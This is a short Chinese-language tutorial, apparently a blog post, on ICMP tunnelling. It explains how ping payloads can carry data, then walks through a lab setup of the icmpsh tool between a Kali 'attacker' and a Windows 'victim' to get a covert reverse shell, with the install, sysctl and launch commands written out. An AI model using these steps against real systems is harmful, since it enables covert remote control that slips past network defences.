ICMP隧道原理


    其实ping在通信的时候，是传输内容的，比如windows传输的默认内容就是abcdefghijklmnopqrstuvwabcdefghi而linux传输的是默认内容是!”#$%&’()+,-./01234567，

    那么我们是否可以改变传输的内容呢？答案是可以改变，但是一旦改变就成了畸形的icmp包，对方机器根本不认识，那么我们就需要双方机器建立一个处理畸形数据包的工具

02
ICMP的使用



环境：

kali（攻击者）192.168.106.133

windows（受害者）192.168.0.106

首先是安装

git clone https://github.com/inquisb/icmpsh.git

apt-get install python-impacket

在我们的kali(192.168.106.133)上面安装

然后在我们的kali上面使用命令

sysctl -w net.ipv4.icmp_echo_ignore_all=1

上面的命令是关闭icmp的应答，如果像开启就把后面的1改成0

然后kali使用命令

python icmpsh_m.py 自己的ip地址 对方的公网地址

在这里其实如果你用的是虚拟机的话，公网的地址其实是不一样的，如果你想看到底是windows在你的kali下对应的ip地址，你就可以使用

tcpdump icmp


然后在下载的文件夹里面还有一个exe，那是给windows用的

windows执行

发现上线成功
